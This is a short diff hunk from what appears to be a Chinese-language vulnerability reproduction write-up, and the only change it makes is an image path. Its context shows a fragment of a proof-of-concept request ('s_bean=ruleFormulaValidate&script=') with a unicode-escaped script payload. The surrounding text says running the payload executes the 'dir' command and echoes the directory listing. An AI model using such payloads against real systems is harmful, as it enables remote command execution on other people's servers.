@@ -22,4 +22,4 @@ s_bean=ruleFormulaValidate&script=\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u00
 ```
 ## 漏洞复现
 执行POC，执行dir命令，回显目录
-![](./assets/20231026210940.png)
+![](../../assets/20231026210940.png)
